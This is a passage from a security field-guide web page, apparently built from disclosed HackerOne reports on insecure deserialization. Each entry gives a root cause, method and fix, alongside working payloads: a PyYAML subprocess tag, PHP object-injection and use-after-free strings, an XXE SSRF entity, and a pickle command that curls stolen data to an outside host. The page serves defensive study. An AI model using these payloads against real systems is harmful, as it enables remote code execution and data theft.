+<h4>Root cause</h4><p style="margin:0">PyYAML yaml.load() (without SafeLoader) constructs arbitrary Python objects from YAML tags, so any config-file-driven yaml.load() is a code-execution sink. Kubernetes test-infra Gubernator loaded config via yaml.load().</p>
+<h4>Method</h4><ol><li>Find code calling yaml.load() on attacker-influenced YAML (config files, API bodies)</li><li>Craft YAML using python object-construction tags to invoke subprocess/os.system</li><li>Get the target to load/update the config to trigger execution</li></ol>
+<div class="pre"># config.yaml (PyYAML &lt; 5.1 always works; &gt;=5.1 needs subprocess already imported, e.g. under Flask)
+!!python/object/apply:subprocess.check_output [['ls']]</div>
+<p class="insight"><b>Insight —</b> grep any codebase for yaml.load( (Python), Yaml.load (SnakeYAML), Marshal.load, pickle.loads on untrusted input; the fix is always the safe variant (safe_load / SafeConstructor). Exploitability with PyYAML&gt;=5.1 hinges on whether the target process already imports subprocess.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1051192" target="_blank" rel="noopener">hackerone.com/reports/1051192</a></span><a class="src" href="#report-1051192" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-185907" style="--sv:var(--sev-low)" data-sev="1" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unchecked unserialize() on plugin-update response body</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#185907</b> · iandunn-projects · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>iandunn-projects</b></span><span>Surface <b>web</b></span><span>Chain <b>unserialize sink -&gt; PHP POP gadget chain -&gt; RCE (if ga</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A WordPress plugin calls unserialize($request['body']['plugins']) on data derived from the plugin-update HTTP flow without restricting allowed classes, giving a PHP object-injection (POP) sink if an attacker can control that response.</p>
+<h4>Method</h4><ol><li>Grep the codebase for unserialize( on any request/response-derived data.</li><li>Confirm no allowed_classes=&gt;false guard and that the value is attacker-influenceable.</li><li>Chain to an available POP gadget in loaded plugins/core for the actual impact.</li></ol>
+<div class="pre">unserialize( $request['body']['plugins'] ); // no allowed_classes restriction
+// fix: json_decode, or PHP7 unserialize($data, ['allowed_classes'=&gt;false])</div>
+<p class="insight"><b>Insight —</b> Update/callback handlers that unserialize remote response bodies are a classic overlooked object-injection sink. Audit for unserialize() on anything crossing a trust boundary; recommend json or allowed_classes=&gt;false.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/185907" target="_blank" rel="noopener">hackerone.com/reports/185907</a></span><a class="src" href="#report-185907" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-415137" style="--sv:var(--sev-none)" data-sev="0" data-votes="17" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>LFR -&gt; PHP object injection -&gt; XXE -&gt; SSRF -&gt; Python pickle RCE chain</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#415137</b> · h1-5411-ctf · none · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-5411-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>LFR -&gt; source disclosure -&gt; PHP object injection (unse</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A template filename parameter allows local file read (source disclosure); an import endpoint feeds attacker bytes to unserialize() (PHP object injection); a ConfigFile object's __toString runs DOMDocument::loadXML with entities enabled (XXE); XXE reaches an internal service that deserializes Python pickle (RCE).</p>
+<h4>Method</h4><ol><li>Use template= to read arbitrary files and dump the app source (LFR).</li><li>Craft a base64(serialize(array($configObj))) blob and upload via the import endpoint -&gt; unserialize() creates the object.</li><li>Trigger __toString (object echoed into an iframe src) which calls loadXML(config_raw) with LIBXML_NOENT|LIBXML_DTDLOAD -&gt; XXE.</li><li>Use php://filter + http://localhost:1337 XXE to read/SSRF the internal maintenance API.</li><li>POST a malicious base64 Python pickle to /update-status -&gt; RCE on the internal service; exfil via curl to attacker host.</li></ol>
+<div class="pre"># PHP object injection blob (wrapped in array to survive array_merge):
+echo base64_encode(serialize(array($test))); // $test-&gt;config_raw = XXE payload
+# non-blind XXE for SSRF+read:
+&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root[&lt;!ENTITY foo SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:1337/"&gt;]&gt;&lt;test&gt;&lt;toptext&gt;&amp;foo;&lt;/toptext&gt;&lt;/test&gt;
+# pickle RCE gadget (posix.system):
+python pickle.py 'curl -X POST -d "|$(cat flag.txt)|" myserver.com'</div>
+<p class="insight"><b>Insight —</b> Chain primitives: file-read to recover source, then hunt unserialize()/loadXML sinks. PHP object injection weaponizes any class with a useful magic method (__toString/__wakeup/__destruct). XXE with entity output is a non-blind SSRF to discover internal services; wrap responses in php://filter/convert.base64-encode to read binary/HTTP. Any endpoint taking base64 pickle is direct RCE. Wrap objects in an array when the sink array_merges into an array.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/415137" target="_blank" rel="noopener">hackerone.com/reports/415137</a></span><a class="src" href="#report-415137" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-159946" style="--sv:var(--sev-none)" data-sev="0" data-votes="16" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP session data injection via mishandled session names</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#159946</b> · ibb · awarded · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">PHP's php/php_binary session serialize handlers skip disallowed session variable names during decode instead of failing, so attacker-controllable session keys let arbitrary serialized data be injected and later unserialized (object injection, UAF).</p>
+<h4>Method</h4><ol><li>Find apps that write user input into session keys (e.g. $_SESSION = array_merge($_SESSION,$_POST) or $_SESSION[$_GET['id']]=...).</li><li>Set a session variable whose name/value embeds a serialized object using the handler's delimiter.</li><li>On the next request the handler decodes and injects the crafted serialized data into the session -&gt; feeds an unserialize sink.</li></ol>
+<div class="pre">&lt;?php
+ini_set('session.serialize_handler','php');
+session_start();
+$_SESSION['_SESSION'] = 'ryat|O:8:"stdClass":0:{}'; // pipe = PS_DELIMITER
+session_write_close();
+session_start();
+var_dump($_SESSION); // injected stdClass object present</div>
+<p class="insight"><b>Insight —</b> Any code that lets user input reach session variable names turns the session store into an unserialize() attack surface (object injection / gadget chains). Treat $_SESSION key assignment from request data as dangerous; affects php and php_binary handlers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/159946" target="_blank" rel="noopener">hackerone.com/reports/159946</a></span><a class="src" href="#report-159946" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-146233" style="--sv:var(--sev-none)" data-sev="0" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP unserialize() GC use-after-free -&gt; remote memory corruption</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#146233</b> · ibb · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>unserialize UAF -&gt; memory corruption -&gt; potential RCE</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A bug in PHP's garbage-collection algorithm during unserialize() (PHP &gt;=5.3, &lt;7) yields a use-after-free that is remotely exploitable whenever an app unserializes attacker data and then re-serializes/uses it (e.g. serialize(unserialize($user_input))).</p>
+<h4>Method</h4><ol><li>Find code doing unserialize() on user input (cookies, cache, session, API bodies)</li><li>Deliver crafted serialized input that triggers the GC UAF</li><li>Escalate the UAF to control flow / RCE</li></ol>
+<div class="pre">$unserialized = unserialize($user_input);
+print(serialize($unserialized));   // vulnerable pattern (crafted UAF payload per bugs.php.net 72433 / 72434 ZipArchive variant)</div>
+<p class="insight"><b>Insight —</b> unserialize() on untrusted data is a memory-corruption sink as well as a POP-gadget sink; the tell-tale vulnerable pattern is serialize(unserialize($input)). Audit for unserialize on any attacker-reachable value even without obvious gadget classes. ZipArchive class exhibits the same UAF (146235).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/146233" target="_blank" rel="noopener">hackerone.com/reports/146233</a></span><a class="src" href="#report-146233" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-159948" style="--sv:var(--sev-none)" data-sev="0" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP unserialize() UAF via custom Serializable class + back-reference</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#159948</b> · ibb · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>unserialize() UAF -&gt; fake zval (array/object type) -&gt; </b></span></div>
+<h4>Root cause</h4><p style="margin:0">When a nested php_var_unserialize() on a custom (Serializable) object fails, the zval is freed via zval_dtor and reset to bool FALSE, yet the object still holds it; a later R:/r: reference in the same payload points at the freed memory. Attacker fills the freed slot with a fake zval to leak memory or gain code execution.</p>
+<h4>Method</h4><ol><li>Target any class implementing Serializable (unserialize() calls unserialize() internally)</li><li>Send a payload whose inner custom-object unserialize fails, freeing its zval</li><li>Use R:/r: to reference the freed zval and place a crafted fake-zval string in the same array to control type/value</li></ol>
+<div class="pre">&lt;?php
+$fakezval = ptr2str(1122334455).ptr2str(0)."\x00\x00\x00\x00"."\x01"."\x00"."\x00\x00";
+$inner = 'C:3:"obj":3:{ryat';
+$exploit = 'a:4:{i:0;i:1;i:1;C:3:"obj":'.strlen($inner).':{'.$inner.'}i:2;s:'.strlen($fakezval).':"'.$fakezval.'";i:3;R:5;}';
+var_dump(unserialize($exploit));
+// ptr2str: pack 8 bytes little-endian</div>
+<p class="insight"><b>Insight —</b> PHP object injection isn't only POP gadgets: a failing nested unserialize on a Serializable class frees a zval that R:/r: back-references reuse. Any endpoint feeding attacker data to unserialize() with custom serializers is a UAF primitive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/159948" target="_blank" rel="noopener">hackerone.com/reports/159948</a></span><a class="src" href="#report-159948" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-73235" style="--sv:var(--sev-none)" data-sev="0" data-votes="3" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP unserialize() use-after-free via __wakeup + back-reference</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#73235</b> · ibb · awarded · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>UAF -&gt; fake zval heap grooming -&gt; zend_eval_string RCE</b></span></div>
+<h4>Root cause</h4><p style="margin:0">During unserialize(), an object's __wakeup() (or property init) can free a zval/its children, but the parser still allows R:/r: back-references to that freed memory, yielding a use-after-free that leaks memory or achieves RCE.</p>
+<h4>Method</h4><ol><li>Define a class whose __wakeup() unsets a property (freeing its zval).</li><li>Craft serialized data with an R: reference pointing back to the freed slot.</li><li>unserialize() dereferences freed memory; groom the heap with a fake zval to control type/pointers and reach zend_eval_string for RCE.</li></ol>
+<div class="pre">a:2:{i:0;O:9:"evilClass":1:{s:3:"var";a:1:{i:0;i:1;}}i:1;R:4;}
+// evilClass::__wakeup(){ unset($this-&gt;var); }</div>
+<p class="insight"><b>Insight —</b> Any native unserialize() reachable from user input on PHP &lt; 5.6.7/5.5.23/5.4.39 is exploitable via __wakeup/property-destroy + R: back-references. Look for user-controlled serialized blobs (cookies, cache, API params) and fingerprint PHP version.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/73235" target="_blank" rel="noopener">hackerone.com/reports/73235</a></span><a class="src" href="#report-73235" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-98559" style="--sv:var(--sev-none)" data-sev="0" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated Jenkins Java deserialization RCE (commons-collections)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#98559</b> · owncloud · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>owncloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A public, unfirewalled Jenkins CI instance deserializes attacker-supplied data on its remoting/CLI port using the vulnerable commons-collections gadget, giving unauthenticated RCE.</p>
+<h4>Method</h4><ol><li>Find CI host by guessable name (ci.&lt;company&gt;.com), often linked from GitHub</li><li>Confirm Jenkins listening on a public IP with the CLI/remoting port open</li><li>Send a commons-collections deserialization payload to obtain RCE (read /etc/passwd / OS fingerprint to confirm)</li></ol>
+<p class="insight"><b>Insight —</b> Enumerate CI/build servers (ci., jenkins., build.) exposed to the internet; unauth Java services deserializing untrusted data are prime RCE. The 2015 foxglovesecurity commons-collections chain is the classic gadget.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/98559" target="_blank" rel="noopener">hackerone.com/reports/98559</a></span><a class="src" href="#report-98559" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (45 of 69 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">Insecure deserialization labs</a> (hands-on practice).</li>
+<li>All 69 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#deserialization-sinks-by-runtime">Deserialization sinks by runtime</a><a href="#java-readobject-gadget-chains" style="padding-left:24px">↳ Java readObject — gadget chains</a><a href="#json-yaml-polymorphic-typing-caller-picks-the-class" style="padding-left:24px">↳ JSON/YAML polymorphic typing — caller picks the class</a><a href="#ruby-marshal-yaml-leaked-or-static-secret" style="padding-left:24px">↳ Ruby Marshal / YAML — leaked or static secret</a><a href="#php-unserialize-phar-pop-chains" style="padding-left:24px">↳ PHP unserialize / phar:// — POP chains</a><a href="#net-xmlserializer-xaml-dnn-cookie" style="padding-left:24px">↳ .NET — XmlSerializer / XAML / DNN cookie</a><a href="#jndi-log4shell-outbound-lookup-deserialization" style="padding-left:24px">↳ JNDI / Log4Shell — outbound-lookup deserialization</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (69)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ PortSwigger: Insecure deserialization</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
